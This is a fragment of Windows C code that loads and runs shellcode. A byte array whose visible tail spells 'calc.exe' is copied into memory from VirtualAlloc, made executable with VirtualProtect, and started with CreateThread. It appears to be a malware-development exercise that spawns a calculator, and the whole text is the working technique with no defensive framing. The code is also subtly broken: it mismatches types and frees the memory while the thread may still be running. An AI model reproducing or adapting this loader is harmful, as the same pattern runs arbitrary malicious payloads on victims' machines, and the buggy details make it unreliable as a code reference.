...
, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 };
	...
	printf("The size of the payload is : %zu\n", sshellcode);
	printf("The location of the pointer to shellcode is: 0x%p", pshellcode);

	LPVOID pvirtualaddress =  VirtualAlloc(NULL, sshellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	if (pvirtualaddress == NULL) {
		printf("virtual allocation failed with error no: %d\n", GetLastError());

		return -1;

	}

	printf("virtual allocation has been sucessfull at address %p\n", pvirtualaddress);

	memcpy(pvirtualaddress, pshellcode, sshellcode);

	printf("memcpy sucessfully done");

	memset(pshellcode, 0, sshellcode);

	printf("The memory in the pointer to shellcode has been set to all zeros");


	PDWORD oldprotection = NULL;

	VirtualProtect(pvirtualaddress, sshellcode, PAGE_EXECUTE_READWRITE, &oldprotection);

	printf("protection has been changed");


	CreateThread(NULL, NULL, pvirtualaddress, NULL, NULL,NULL);

	printf("thread has been created and the calculator will be spawned");

	printf("press enter to exit the program");


LPVOID pshellcodefree	=VirtualFree(pvirtualaddress, sshellcode, MEM_RELEASE);
	
if (pshellcodefree == NULL) {
	printf("the virtual has thrown a error with error number: %d", GetLastError());
}

printf("the virutal address has been free in address 0x%p", pvirtualaddress);
